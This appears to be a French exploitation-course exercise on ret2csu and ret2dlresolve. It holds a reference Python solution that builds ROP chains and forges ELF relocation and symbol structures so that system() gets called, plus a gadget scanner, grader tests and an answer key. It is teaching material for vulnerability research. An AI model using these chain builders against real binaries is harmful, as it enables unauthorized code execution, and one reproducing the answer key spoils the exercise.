# Exercice 3.4.6-b : universal_gadgets

**Module :**
3.4.6 — ROP Advanced Techniques

**Concept :**
b — Gadgets Universels (ret2csu, ret2dlresolve)

**Difficulte :**
★★★★★★★★★☆ (9/10)

**Type :**
code

**Tiers :**
3 — Integration complexe multi-concepts

**Langage :**
Python 3.12

**Prerequis :**
- Maitrise de la construction de chaines ROP basiques
- Comprehension des structures ELF (PLT, GOT, dynamic)
- Connaissance de __libc_csu_init et du dynamic linker
- Bases de ret2libc

**Domaines :**
Exploit, ELF, ROP

**Duree estimee :**
120 min

**XP Base :**
400

**Complexite :**
T5 O(n^2) x S3 O(n)

---

## SECTION 1 : PROTOTYPE & CONSIGNE

### 1.1 Obligations

**Fichier a rendre :**
`universal_gadgets.py`

**Fonctions autorisees :**
- `struct` (packing/unpacking)
- `json` (entree/sortie)
- `re` (expressions regulieres)
- `sys` (arguments)
- Fonctions built-in Python

**Fonctions interdites :**
- `pwntools` (implementation manuelle requise)
- `ropper`, `ROPgadget`
- Bibliotheques d'analyse binaire (lief, pyelftools)

### 1.2 Consigne

#### 2.4.1 Contexte Culturel — "The Prestige"

*"Every great magic trick consists of three parts. The Pledge, The Turn, and The Prestige."*

Dans **The Prestige**, les magiciens rivaux utilisent des techniques de plus en plus elaborees pour creer l'illusion parfaite. Les gadgets universels sont la magie ultime de l'exploitation : ils existent dans TOUS les binaires compiles avec GCC et permettent de controler TOUS les arguments necessaires.

**ret2csu** utilise le code d'initialisation de la libc (`__libc_csu_init`) present dans tout binaire. C'est comme decouvrir que chaque theatre a une trappe secrete au meme endroit.

**ret2dlresolve** va encore plus loin : il force le dynamic linker a resoudre une fonction que vous inventez ! C'est comme convaincre le systeme de securite que vous avez toujours ete employe ici.

#### 2.4.2 Enonce Academique

Les gadgets universels exploitent des structures presentes dans tous les binaires ELF dynamiques :

1. **ret2csu** : Utilise `__libc_csu_init` pour controler RDI, RSI, RDX via un call indirect
2. **ret2dlresolve** : Forge des structures de resolution pour appeler n'importe quelle fonction

**Ta mission :**

Ecrire un programme `universal_gadgets.py` qui :

1. **Identifie** les gadgets ret2csu dans __libc_csu_init
2. **Construit** une chaine ret2csu pour controler RDI, RSI, RDX
3. **Forge** les structures dlresolve (SYMTAB, STRTAB, RELA)
4. **Genere** un exploit complet sans leak ASLR

**Entree :**
- Fichier JSON contenant :
  - `binary_info` : informations sur le binaire (adresses des sections)
  - `technique` : "ret2csu" ou "ret2dlresolve"
  - `target_function` : fonction a appeler
  - `args` : arguments souhaites

**Sortie :**
- JSON avec la chaine ROP et/ou les structures forgees

**Structure __libc_csu_init typique :**
```asm
; Gadget 1 (popall) - souvent a csu_init + 0x3a
pop rbx
pop rbp
pop r12
pop r13
pop r14
pop r15
ret

; Gadget 2 (callgadget) - souvent a csu_init + 0x20
mov rdx, r14    ; r14 -> RDX
mov rsi, r13    ; r13 -> RSI
mov edi, r12d   ; r12 -> RDI (32-bit!)
call [r15 + rbx*8]  ; Call indirect
add rbx, 1
cmp rbp, rbx
jne <loop>
; puis tombe dans gadget 1
```

**Structures dlresolve :**
- `Elf64_Rela` : relocation entry
- `Elf64_Sym` : symbol entry
- Index dans STRTAB pour le nom de fonction

**Exemples :**

| Entree | Sortie |
|--------|--------|
| `{"technique": "ret2csu", "binary_info": {"csu_init": "0x401200"}, "target_function": "write", "args": [1, "0x402000", 8]}` | `{"rop_chain": [...], "description": "ret2csu call write(1, 0x402000, 8)"}` |

### 1.3 Prototype

```python
#!/usr/bin/env python3
"""
universal_gadgets.py - ret2csu et ret2dlresolve
"""

import json
import struct
import sys

def pack64(value: int) -> bytes:
    """Pack une valeur 64-bit en little-endian."""
    pass

def pack32(value: int) -> bytes:
    """Pack une valeur 32-bit en little-endian."""
    pass

def build_ret2csu_chain(csu_init: int, got_entry: int,
                         rdi: int, rsi: int, rdx: int) -> list:
    """
    Construit une chaine ret2csu.

    Args:
        csu_init: Adresse de __libc_csu_init
        got_entry: Adresse GOT de la fonction a appeler
        rdi, rsi, rdx: Arguments souhaites

    Returns:
        Liste d'elements de la chaine ROP
    """
    pass

def forge_elf64_sym(name_offset: int, info: int = 0x12) -> bytes:
    """
    Forge une structure Elf64_Sym.

    Args:
        name_offset: Offset du nom dans STRTAB
        info: Type et binding (0x12 = STT_FUNC | STB_GLOBAL)

    Returns:
        24 bytes de la structure
    """
    pass

def forge_elf64_rela(offset: int, sym_index: int, addend: int = 0) -> bytes:
    """
    Forge une structure Elf64_Rela.

    Args:
        offset: Adresse ou ecrire
        sym_index: Index dans SYMTAB
        addend: Addend

    Returns:
        24 bytes de la structure
    """
    pass

def build_ret2dlresolve(binary_info: dict, function_name: str,
                        args: list) -> dict:
    """
    Construit un exploit ret2dlresolve.

    Args:
        binary_info: Informations sur le binaire
        function_name: Nom de la fonction a resoudre
        args: Arguments

    Returns:
        Dictionnaire avec structures et chaine ROP
    """
    pass

def create_exploit(data: dict) -> dict:
    """
    Cree l'exploit selon la technique demandee.
    """
    pass

def main():
    """Point d'entree principal."""
    pass

if __name__ == "__main__":
    main()
```

---

## SECTION 2 : LE SAVIEZ-VOUS ?

### L'origine de ret2csu

ret2csu a ete popularise par le challenge "Blackngold" de VolgaCTF 2016. Un participant a decouvert que `__libc_csu_init`, present dans tous les binaires compiles avec GCC utilisant la libc, contenait des gadgets permettant de controler RDI, RSI, et RDX sans avoir besoin de gadgets classiques.

C'etait revolutionnaire car RDX est souvent le registre le plus difficile a controler (les gadgets `pop rdx; ret` sont rares).

### La magie de ret2dlresolve

Le dynamic linker (ld.so) utilise des structures dans le binaire pour resoudre les symboles au runtime. ret2dlresolve forge ces structures pour tromper le linker et lui faire resoudre une fonction arbitraire !

C'est comme creer un faux badge d'employe tellement convaincant que meme le systeme de securite y croit.

---

## SECTION 2.5 : DANS LA VRAIE VIE

**Metier : Vulnerability Researcher / CTF Player**

Ces techniques sont utilisees dans des scenarios avances :

**Cas d'usage concret - No leak exploitation :**
Quand ASLR est actif et qu'il n'y a pas de primitive de leak, ret2dlresolve permet d'obtenir un shell sans connaitre aucune adresse de la libc.

**Cas d'usage concret - Binaires minimal :**
Sur des binaires statiquement lies ou avec peu de gadgets, ret2csu garantit le controle des arguments.

**Competitions :** Ces techniques sont regulierement requises dans les CTF de haut niveau (DEF CON, PlaidCTF, etc.).

---

## SECTION 3 : EXEMPLE D'UTILISATION

### 3.0 Session bash

```bash
$ ls
universal_gadgets.py  binary_info.json

$ cat binary_info.json
{
  "technique": "ret2csu",
  "binary_info": {
    "csu_init": "0x4011d0",
    "csu_gadget1": "0x40120a",
    "csu_gadget2": "0x4011f0",
    "got_write": "0x404018"
  },
  "target_function": "write",
  "args": [1, "0x404000", 32]
}

$ python3 universal_gadgets.py binary_info.json
{
  "technique": "ret2csu",
  "rop_chain": [
    {"addr": "0x40120a", "purpose": "pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret"},
    {"addr": "0x0", "purpose": "rbx = 0"},
    {"addr": "0x1", "purpose": "rbp = 1 (loop counter)"},
    {"addr": "0x1", "purpose": "r12 = RDI (fd=1)"},
    {"addr": "0x404000", "purpose": "r13 = RSI (buf addr)"},
    {"addr": "0x20", "purpose": "r14 = RDX (count=32)"},
    {"addr": "0x404010", "purpose": "r15 = &got_write - rbx*8"},
    {"addr": "0x4011f0", "purpose": "mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15+rbx*8]"},
    {"addr": "0x0", "purpose": "junk (add rbx,1 puis cmp/jne)"},
    {"addr": "0x0", "purpose": "junk"},
    {"addr": "0x0", "purpose": "junk"},
    {"addr": "0x0", "purpose": "junk"},
    {"addr": "0x0", "purpose": "junk"},
    {"addr": "0x0", "purpose": "junk"},
    {"addr": "0x0", "purpose": "junk"}
  ],
  "total_size": 120,
  "description": "ret2csu to call write(1, 0x404000, 32)"
}

$ cat dlresolve_info.json
{
  "technique": "ret2dlresolve",
  "binary_info": {
    "plt": "0x401020",
    "got": "0x404000",
    "dynsym": "0x4003c0",
    "dynstr": "0x400480",
    "rela_plt": "0x400560",
    "bss": "0x404100"
  },
  "target_function": "system",
  "args": ["0x404100"]
}

$ python3 universal_gadgets.py dlresolve_info.json
{
  "technique": "ret2dlresolve",
  "forged_structures": {
    "rela_offset": "0x404100",
    "sym_offset": "0x404118",
    "str_offset": "0x404130"
  },
  "rop_chain": [
    {"addr": "0x401020", "purpose": "plt stub (push got[1], jmp got[2])"},
    {"addr": "calculated_reloc_arg", "purpose": "reloc_arg for _dl_runtime_resolve"}
  ],
  "payload_at_bss": "forged Elf64_Rela + Elf64_Sym + 'system\\x00'",
  "description": "ret2dlresolve to resolve and call system(0x404100)"
}
```

---

## SECTION 3.1 : BONUS STANDARD (OPTIONNEL)

**Difficulte Bonus :**
★★★★★★★★★★ (10/10)

**Recompense :**
XP x2

**Time Complexity attendue :**
O(n^2)

**Space Complexity attendue :**
O(n)

**Domaines Bonus :**
Exploit, ELF, Link

### 3.1.1 Consigne Bonus

**Extension "Full Exploitation Framework" :**

Etendre le programme pour :

1. **Combiner** ret2csu et ret2dlresolve en une seule chaine
2. **Gerer** les cas ou relro=full (GOT read-only)
3. **Supporter** les binaires PIE (calcul d'offsets relatifs)
4. **Automatiser** la detection des offsets csu

**Contraintes supplementaires :**
```
+-----------------------------------------------+
|  Full RELRO: ret2dlresolve impossible         |
|  PIE: tous les offsets sont relatifs          |
|  Auto-detect: scanner pour csu gadgets        |
|  Chain combination: csu + dlresolve           |
+-----------------------------------------------+
```

### 3.1.2 Prototype Bonus

```python
def detect_csu_offsets(code_bytes: bytes, base: int) -> dict:
    """
    Detecte automatiquement les offsets des gadgets csu.
    """
    pass

def check_relro_status(binary_info: dict) -> str:
    """
    Determine le status RELRO (none, partial, full).
    """
    pass

def build_combined_chain(binary_info: dict, stages: list) -> dict:
    """
    Construit une chaine combinant plusieurs techniques.
    """
    pass
```

### 3.1.3 Ce qui change par rapport a l'exercice de base

| Aspect | Base | Bonus |
|--------|------|-------|
| Techniques | Une seule | Combinaison |
| Detection | Offsets fournis | Auto-detection |
| RELRO | Partial uniquement | Gestion Full |
| PIE | Non-PIE | Support PIE |

---

## SECTION 4 : ZONE CORRECTION (POUR LE TESTEUR)

### 4.1 Moulinette

| Test | Entree | Sortie Attendue | Points |
|------|--------|-----------------|--------|
| ret2csu_basic | csu_info + args | Chain valide | 15 |
| ret2csu_rdi_truncation | rdi > 0xffffffff | Warning 32-bit | 10 |
| ret2csu_loop_exit | rbp != rbx+1 | Boucle infinie detectee | 10 |
| dlresolve_forge_rela | target=system | Elf64_Rela correct | 15 |
| dlresolve_forge_sym | target=system | Elf64_Sym correct | 15 |
| dlresolve_alignment | structures | Aligne sur 8 bytes | 10 |
| dlresolve_reloc_arg | plt_stub | Calcul correct | 15 |
| combined_chain | multi-stage | Chain complete | 10 |

### 4.2 main.c de test

Non applicable (exercice Python).

### 4.3 Solution de reference

```python
#!/usr/bin/env python3
"""
universal_gadgets.py - Solution de reference
"""

import json
import struct
import sys

def pack64(value: int) -> bytes:
    """Pack une valeur 64-bit en little-endian."""
    return struct.pack('<Q', value)

def pack32(value: int) -> bytes:
    """Pack une valeur 32-bit en little-endian."""
    return struct.pack('<I', value)

def parse_hex(value) -> int:
    """Parse une valeur hexadecimale ou entiere."""
    if isinstance(value, int):
        return value
    value = str(value).strip()
    if value.lower().startswith('0x'):
        return int(value, 16)
    try:
        return int(value, 16)
    except ValueError:
        return int(value)

# Offsets typiques dans __libc_csu_init
CSU_GADGET1_OFFSET = 0x3a  # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
CSU_GADGET2_OFFSET = 0x20  # mov rdx, r14; mov rsi, r13; mov edi, r12d; call [r15+rbx*8]

def build_ret2csu_chain(csu_init: int, got_entry: int,
                         rdi: int, rsi: int, rdx: int) -> list:
    """Construit une chaine ret2csu."""

    gadget1 = csu_init + CSU_GADGET1_OFFSET  # pop all
    gadget2 = csu_init + CSU_GADGET2_OFFSET  # call indirect

    chain = []

    # Gadget 1: pop rbx, rbp, r12, r13, r14, r15
    chain.append({'addr': hex(gadget1), 'purpose': 'pop rbx; pop rbp; pop r12-r15; ret'})

    # rbx = 0 (pour le calcul r15 + rbx*8)
    chain.append({'addr': '0x0', 'purpose': 'rbx = 0'})

    # rbp = 1 (pour sortir de la boucle: cmp rbp, rbx apres add rbx, 1)
    chain.append({'addr': '0x1', 'purpose': 'rbp = 1 (exit loop after one iteration)'})

    # r12 = RDI (attention: mov edi, r12d donc 32-bit!)
    chain.append({'addr': hex(rdi & 0xffffffff), 'purpose': f'r12 -> RDI (low 32 bits)'})

    # r13 = RSI
    chain.append({'addr': hex(rsi), 'purpose': f'r13 -> RSI'})

    # r14 = RDX
    chain.append({'addr': hex(rdx), 'purpose': f'r14 -> RDX'})

    # r15 = adresse GOT (car rbx=0, on call [r15+0])
    chain.append({'addr': hex(got_entry), 'purpose': f'r15 = GOT entry (call [r15+rbx*8])'})

    # Gadget 2: mov rdx, r14; mov rsi, r13; mov edi, r12d; call [r15+rbx*8]
    chain.append({'addr': hex(gadget2), 'purpose': 'ret2csu gadget2 (setup regs + call)'})

    # Apres le call, le code continue et pop 7 valeurs avant ret
    # (add rbx, 1; cmp rbp, rbx; jne ... puis pop all)
    for i in range(7):
        chain.append({'addr': '0x0', 'purpose': f'junk {i+1}/7 (cleanup after call)'})

    return chain

def forge_elf64_sym(name_offset: int, info: int = 0x12, other: int = 0,
                    shndx: int = 0, value: int = 0, size: int = 0) -> bytes:
    """
    Forge une structure Elf64_Sym (24 bytes).

    typedef struct {
        Elf64_Word    st_name;   // 4 bytes
        unsigned char st_info;   // 1 byte
        unsigned char st_other;  // 1 byte
        Elf64_Half    st_shndx;  // 2 bytes
        Elf64_Addr    st_value;  // 8 bytes
        Elf64_Xword   st_size;   // 8 bytes
    } Elf64_Sym;
    """
    sym = b''
    sym += pack32(name_offset)  # st_name
    sym += bytes([info])        # st_info (0x12 = STT_FUNC | STB_GLOBAL)
    sym += bytes([other])       # st_other
    sym += struct.pack('<H', shndx)  # st_shndx
    sym += pack64(value)        # st_value
    sym += pack64(size)         # st_size
    return sym

def forge_elf64_rela(offset: int, sym_index: int, rtype: int = 7,
                      addend: int = 0) -> bytes:
    """
    Forge une structure Elf64_Rela (24 bytes).

    typedef struct {
        Elf64_Addr   r_offset;  // 8 bytes
        Elf64_Xword  r_info;    // 8 bytes (sym_index << 32 | type)
        Elf64_Sxword r_addend;  // 8 bytes
    } Elf64_Rela;
    """
    r_info = (sym_index << 32) | rtype  # rtype 7 = R_X86_64_JUMP_SLOT
    rela = b''
    rela += pack64(offset)   # r_offset
    rela += pack64(r_info)   # r_info
    rela += pack64(addend)   # r_addend
    return rela

def build_ret2dlresolve(binary_info: dict, function_name: str,
                        args: list) -> dict:
    """Construit un exploit ret2dlresolve."""

    plt = parse_hex(binary_info.get('plt', 0))
    got = parse_hex(binary_info.get('got', 0))
    dynsym = parse_hex(binary_info.get('dynsym', 0))
    dynstr = parse_hex(binary_info.get('dynstr', 0))
    rela_plt = parse_hex(binary_info.get('rela_plt', 0))
    bss = parse_hex(binary_info.get('bss', 0))

    # On va placer nos structures forgees dans .bss
    # Layout: Elf64_Rela (24) + Elf64_Sym (24) + string
    forge_base = bss

    # Aligner sur 8 bytes
    if forge_base % 8 != 0:
        forge_base = (forge_base + 7) & ~7

    rela_offset = forge_base
    sym_offset = forge_base + 24
    str_offset = forge_base + 48

    # Calculer l'index du symbole par rapport a DYNSYM
    # sym_index = (sym_offset - dynsym) / sizeof(Elf64_Sym)
    sym_index = (sym_offset - dynsym) // 24

    # Calculer l'offset du nom par rapport a DYNSTR
    name_offset = str_offset - dynstr

    # Forger Elf64_Sym
    forged_sym = forge_elf64_sym(name_offset)

    # Forger Elf64_Rela
    # r_offset peut pointer vers une zone writable (on utilise got)
    forged_rela = forge_elf64_rela(got, sym_index)

    # Calculer reloc_arg (index dans .rela.plt)
    # reloc_arg = (rela_offset - rela_plt) / sizeof(Elf64_Rela)
    reloc_arg = (rela_offset - rela_plt) // 24

    # Payload a placer en .bss
    payload = forged_rela + forged_sym + function_name.encode() + b'\x00'

    # Construire la chaine ROP
    chain = []

    # On a besoin d'un gadget pop rdi pour l'argument
    # Puis on jump vers plt[0] avec reloc_arg sur la stack
    chain.append({
        'note': 'Need pop rdi gadget to set arg, then call PLT[0] with reloc_arg'
    })

    return {
        'technique': 'ret2dlresolve',
        'forged_structures': {
            'rela_offset': hex(rela_offset),
            'sym_offset': hex(sym_offset),
            'str_offset': hex(str_offset),
            'reloc_arg': reloc_arg,
            'sym_index': sym_index,
            'name_offset': name_offset
        },
        'payload_hex': payload.hex(),
        'payload_size': len(payload),
        'rop_chain': chain,
        'description': f'ret2dlresolve to call {function_name}()'
    }

def create_exploit(data: dict) -> dict:
    """Cree l'exploit selon la technique demandee."""

    technique = data.get('technique', 'ret2csu')
    binary_info = data.get('binary_info', {})
    target_function = data.get('target_function', 'system')
    args = data.get('args', [])

    if technique == 'ret2csu':
        csu_init = parse_hex(binary_info.get('csu_init', 0))
        got_entry = parse_hex(binary_info.get(f'got_{target_function}',
                                              binary_info.get('got_write', 0)))

        # Parser les arguments
        rdi = parse_hex(args[0]) if len(args) > 0 else 0
        rsi = parse_hex(args[1]) if len(args) > 1 else 0
        rdx = parse_hex(args[2]) if len(args) > 2 else 0

        chain = build_ret2csu_chain(csu_init, got_entry, rdi, rsi, rdx)

        # Generer le payload bytes
        payload = b''
        for item in chain:
            if item['addr'] != 'note':
                payload += pack64(parse_hex(item['addr']))

        return {
            'technique': 'ret2csu',
            'rop_chain': chain,
            'total_size': len(payload),
            'payload_hex': payload.hex(),
            'description': f'ret2csu to call {target_function}({rdi}, {rsi}, {rdx})',
            'warnings': ['RDI is truncated to 32 bits!'] if rdi > 0xffffffff else []
        }

    elif technique == 'ret2dlresolve':
        return build_ret2dlresolve(binary_info, target_function, args)

    return {'error': f'Unknown technique: {technique}'}

def main():
    """Point d'entree principal."""
    if len(sys.argv) < 2:
        print("Usage: universal_gadgets.py <input.json>", file=sys.stderr)
        sys.exit(1)

    input_file = sys.argv[1]

    if input_file == '-':
        data = json.load(sys.stdin)
    else:
        with open(input_file, 'r') as f:
            data = json.load(f)

    result = create_exploit(data)
    print(json.dumps(result, indent=2))

if __name__ == "__main__":
    main()
```

### 4.4 Solutions alternatives acceptees

```python
# Alternative 1: Offsets csu configurables
def build_ret2csu_configurable(csu_init, gadget1_off, gadget2_off, got_entry, rdi, rsi, rdx):
    gadget1 = csu_init + gadget1_off
    gadget2 = csu_init + gadget2_off
    # ...
```

```python
# Alternative 2: Helper pour structures ELF
class Elf64Sym:
    SIZE = 24
    def __init__(self, name_offset, info=0x12):
        self.name_offset = name_offset
        self.info = info

    def pack(self):
        return struct.pack('<IBBHQQ', self.name_offset, self.info, 0, 0, 0, 0)
```

### 4.5 Solutions refusees (avec explications)

```python
# REFUSE: Ignore la troncature 32-bit de RDI
def build_ret2csu_bad(csu_init, got, rdi, rsi, rdx):
    chain = []
    # ...
    chain.append(hex(rdi))  # Si rdi > 0xffffffff, c'est faux!

# Pourquoi c'est faux: mov edi, r12d ne garde que 32 bits
```

```python
# REFUSE: Mauvais calcul de reloc_arg
def calc_reloc_arg_bad(rela_offset, rela_plt):
    return rela_offset - rela_plt  # Oublie de diviser par sizeof!

# Pourquoi c'est faux: reloc_arg est un INDEX, pas un offset
```

### 4.6 Solution bonus de reference

```python
#!/usr/bin/env python3
"""
universal_gadgets.py - Solution bonus avec detection automatique
"""

# ... (fonctions de base) ...

def detect_csu_offsets(code_bytes: bytes, base: int) -> dict:
    """Detecte automatiquement les offsets des gadgets csu."""

    # Patterns a chercher
    # Gadget1: 5b 5d 41 5c 41 5d 41 5e 41 5f c3
    # (pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret)
    gadget1_pattern = bytes([0x5b, 0x5d, 0x41, 0x5c, 0x41, 0x5d,
                             0x41, 0x5e, 0x41, 0x5f, 0xc3])

    # Gadget2: 4c 89 f2 4c 89 ee 44 89 e7 41 ff 14 df
    # (mov rdx, r14; mov rsi, r13; mov edi, r12d; call [r15+rbx*8])
    gadget2_pattern = bytes([0x4c, 0x89, 0xf2, 0x4c, 0x89, 0xee,
                             0x44, 0x89, 0xe7])

    result = {}

    # Chercher gadget1
    idx = code_bytes.find(gadget1_pattern)
    if idx != -1:
        result['gadget1'] = hex(base + idx)
        result['gadget1_offset'] = idx

    # Chercher gadget2
    idx = code_bytes.find(gadget2_pattern)
    if idx != -1:
        result['gadget2'] = hex(base + idx)
        result['gadget2_offset'] = idx

    return result

def check_relro_status(binary_info: dict) -> str:
    """Determine le status RELRO."""
    # Si got est dans une section read-only, c'est full RELRO
    got = parse_hex(binary_info.get('got', 0))
    got_plt = parse_hex(binary_info.get('got_plt', 0))

    # Heuristique simple
    if binary_info.get('relro') == 'full':
        return 'full'
    elif binary_info.get('relro') == 'partial':
        return 'partial'

    return 'none'

def build_combined_chain(binary_info: dict, stages: list) -> dict:
    """Construit une chaine combinant plusieurs techniques."""
    full_chain = []

    for stage in stages:
        technique = stage.get('technique')
        if technique == 'ret2csu':
            chain = build_ret2csu_chain(
                parse_hex(binary_info.get('csu_init')),
                parse_hex(stage.get('got_entry')),
                parse_hex(stage.get('rdi', 0)),
                parse_hex(stage.get('rsi', 0)),
                parse_hex(stage.get('rdx', 0))
            )
            full_chain.extend(chain)
        elif technique == 'ret2dlresolve':
            result = build_ret2dlresolve(binary_info, stage.get('function'), [])
            full_chain.append({'stage': 'dlresolve', 'data': result})

    return {'combined_chain': full_chain, 'stage_count': len(stages)}
```

### 4.7 Solutions alternatives bonus

```python
# Alternative: Scanner de patterns plus robuste
def scan_for_gadgets(binary_bytes, base):
    gadgets = []
    # Scanner avec wildcards pour variations de compilateur
    patterns = [
        (b'\x5b\x5d\x41\x5c', 'pop rbx; pop rbp; pop r12'),
        # ...
    ]
    for pattern, desc in patterns:
        idx = 0
        while True:
            idx = binary_bytes.find(pattern, idx)
            if idx == -1:
                break
            gadgets.append({'addr': base + idx, 'desc': desc})
            idx += 1
    return gadgets
```

### 4.8 Solutions refusees bonus

```python
# REFUSE: Ignore Full RELRO
def build_dlresolve_bad(binary_info, function):
    # Ne verifie pas si GOT est writable
    return build_ret2dlresolve(binary_info, function, [])

# Pourquoi c'est faux: ret2dlresolve ne fonctionne pas avec Full RELRO
```

### 4.9 spec.json (ENGINE v22.1)

```json
{
  "name": "universal_gadgets",
  "language": "python",
  "version": "3.12",
  "type": "code",
  "tier": 3,
  "tags": ["rop", "ret2csu", "ret2dlresolve", "elf", "phase3"],
  "passing_score": 70,

  "function": {
    "name": "create_exploit",
    "prototype": "def create_exploit(data: dict) -> dict",
    "return_type": "dict"
  },

  "driver": {
    "edge_cases": [
      {
        "name": "ret2csu_basic",
        "args": [{"technique": "ret2csu", "binary_info": {"csu_init": "0x401200"}, "args": [1, 2, 3]}],
        "expected_contains": ["rop_chain"]
      },
      {
        "name": "rdi_truncation_warning",
        "args": [{"technique": "ret2csu", "binary_info": {"csu_init": "0x401200"}, "args": ["0x100000000", 0, 0]}],
        "expected_contains": ["warnings"],
        "is_trap": true
      }
    ]
  },

  "norm": {
    "allowed_functions": ["struct", "json", "re", "sys"],
    "forbidden_functions": ["pwn", "pwntools", "lief", "pyelftools"],
    "blocking": true
  }
}
```

### 4.10 Solutions Mutantes (minimum 5)

```python
# Mutant A : Oublie que r12 -> edi est 32-bit
def build_ret2csu_mutant_a(csu_init, got, rdi, rsi, rdx):
    chain = []
    # ...
    chain.append(hex(rdi))  # 0x7fff0000dead tronque a 0x0000dead!

# Pourquoi c'est faux: mov edi, r12d ne copie que 32 bits
```

```python
# Mutant B : Mauvaise valeur de rbp
def build_ret2csu_mutant_b(csu_init, got, rdi, rsi, rdx):
    chain = []
    # ...
    chain.append('0x0')  # rbp = 0 au lieu de 1
    # Resultat: boucle infinie (cmp rbp, rbx ne sera jamais vrai)

# Pourquoi c'est faux: rbp doit etre rbx+1 pour sortir de la boucle
```

```python
# Mutant C : Sizeof incorrect pour Elf64_Rela
def calc_reloc_arg_mutant_c(rela_offset, rela_plt):
    return (rela_offset - rela_plt) // 8  # 8 au lieu de 24!

# Pourquoi c'est faux: sizeof(Elf64_Rela) = 24, pas 8
```

```python
# Mutant D : Mauvais r_info
def forge_rela_mutant_d(offset, sym_index):
    r_info = sym_index | 7  # Oublie le shift << 32!
    return struct.pack('<QQQ', offset, r_info, 0)

# Pourquoi c'est faux: r_info = (sym_index << 32) | type
```

```python
# Mutant E : Alignment ignore
def build_dlresolve_mutant_e(binary_info, function):
    forge_base = binary_info['bss']  # Peut etre non-aligne!
    # ...

# Pourquoi c'est faux: Les structures doivent etre alignees
```

---

## SECTION 5 : COMPRENDRE (DOCUMENT DE COURS COMPLET)

### 5.1 Ce que cet exercice enseigne

Cet exercice enseigne les **gadgets universels** :

1. **ret2csu** : Controler RDI, RSI, RDX via __libc_csu_init
2. **ret2dlresolve** : Forger des structures pour resoudre des fonctions
3. **Structures ELF** : Elf64_Sym, Elf64_Rela, SYMTAB, STRTAB
4. **Exploitation sans leak** : Techniques qui ne requierent pas de connaitre les adresses

### 5.2 LDA - Traduction litterale en francais (MAJUSCULES)

```
FONCTION build_ret2csu_chain QUI RETOURNE UNE LISTE
DEBUT FONCTION
    CALCULER gadget1 = csu_init + 0x3a
    CALCULER gadget2 = csu_init + 0x20

    DECLARER chain COMME LISTE VIDE

    AJOUTER gadget1 A chain  // pop rbx; pop rbp; pop r12-15; ret
    AJOUTER 0 A chain        // rbx = 0
    AJOUTER 1 A chain        // rbp = 1 (pour sortir de la boucle)
    AJOUTER rdi A chain      // r12 -> edi (32 bits!)
    AJOUTER rsi A chain      // r13 -> rsi
    AJOUTER rdx A chain      // r14 -> rdx
    AJOUTER got_entry A chain // r15 (call [r15 + rbx*8])
    AJOUTER gadget2 A chain  // mov rdx, r14; mov rsi, r13; mov edi, r12d; call

    // Apres le call, 7 pops avant ret
    POUR i DE 0 A 6 FAIRE
        AJOUTER 0 (junk) A chain
    FIN POUR

    RETOURNER chain
FIN FONCTION
```

### 5.2.2 Logic Flow (Structured English)

```
ALGORITHME : ret2csu
---
1. CALCULER les adresses des gadgets
   gadget1 = csu_init + offset1 (popall)
   gadget2 = csu_init + offset2 (callgadget)

2. PREPARER la stack:
   - gadget1 address
   - rbx = 0 (pour le calcul d'adresse)
   - rbp = 1 (pour sortir apres une iteration)
   - r12 = RDI souhaite (attention: 32-bit!)
   - r13 = RSI souhaite
   - r14 = RDX souhaite
   - r15 = adresse GOT de la fonction cible

3. AJOUTER gadget2 address

4. AJOUTER 7 valeurs junk pour cleanup

5. RETOURNER la chaine
```

### 5.3 Visualisation ASCII

```
              ret2csu FLOW
    +--------------------------------------------------+
    |                                                  |
    |   __libc_csu_init:                               |
    |                                                  |
    |   gadget2 (0x20):                               |
    |   +------------------------------------------+   |
    |   | mov    rdx, r14                          |   |
    |   | mov    rsi, r13                          |   |
    |   | mov    edi, r12d     ; 32-bit!           |   |
    |   | call   [r15 + rbx*8] ; indirect call     |   |
    |   | add    rbx, 1                            |   |
    |   | cmp    rbp, rbx                          |   |
    |   | jne    gadget2                           |   |
    |   +------------------------------------------+   |
    |              |                                   |
    |              v (falls through when rbx == rbp)   |
    |   gadget1 (0x3a):                               |
    |   +------------------------------------------+   |
    |   | pop    rbx                               |   |
    |   | pop    rbp                               |   |
    |   | pop    r12                               |   |
    |   | pop    r13                               |   |
    |   | pop    r14                               |   |
    |   | pop    r15                               |   |
    |   | ret                                      |   |
    |   +------------------------------------------+   |
    |                                                  |
    +--------------------------------------------------+

              STACK LAYOUT ret2csu
    +--------------------------------------------------+
    |   +------------------+                           |
    |   | gadget1          | <- pop rbx...r15; ret     |
    |   | 0x0              | <- rbx = 0                |
    |   | 0x1              | <- rbp = 1                |
    |   | rdi_value        | <- r12 -> edi             |
    |   | rsi_value        | <- r13 -> rsi             |
    |   | rdx_value        | <- r14 -> rdx             |
    |   | got_entry        | <- r15 (call target)      |
    |   | gadget2          | <- mov; call [r15+rbx*8]  |
    |   | junk x 7         | <- cleanup after call    |
    |   | next_gadget      | <- ou retourner ensuite   |
    |   +------------------+                           |
    +--------------------------------------------------+

              ret2dlresolve STRUCTURES
    +--------------------------------------------------+
    |                                                  |
    |   .rela.plt:              Forged Rela:           |
    |   +------------------+    +------------------+   |
    |   | r_offset         |    | got_entry        |   |
    |   | r_info           |    | sym_idx << 32 |7 |   |
    |   | r_addend         |    | 0                |   |
    |   +------------------+    +------------------+   |
    |                                                  |
    |   .dynsym:                Forged Sym:            |
    |   +------------------+    +------------------+   |
    |   | st_name          |    | name_offset      |   |
    |   | st_info          |    | 0x12             |   |
    |   | ...              |    | 0, 0, 0          |   |
    |   +------------------+    +------------------+   |
    |                                                  |
    |   .dynstr:                Forged String:         |
    |   +------------------+    +------------------+   |
    |   | "printf\0"       |    | "system\0"       |   |
    |   | "puts\0"         |    +------------------+   |
    |   +------------------+                           |
    |                                                  |
    +--------------------------------------------------+
```

### 5.4 Les pieges en detail

#### Piege 1 : Troncature 32-bit de RDI

```python
# MAUVAIS: Ignore la troncature
chain.append(0x7fff12345678)  # r12

# BON: Verifier et avertir
if rdi > 0xffffffff:
    print("WARNING: RDI will be truncated to 32 bits!")
chain.append(rdi & 0xffffffff)
```

#### Piege 2 : rbp != rbx + 1

```python
# MAUVAIS: rbp = 0
chain.append(0x0)  # rbp = 0, rbx = 0 -> boucle infinie!

# BON: rbp = rbx + 1 = 0 + 1 = 1
chain.append(0x1)  # rbp = 1
```

### 5.5 Cours Complet

#### 5.5.1 __libc_csu_init en profondeur

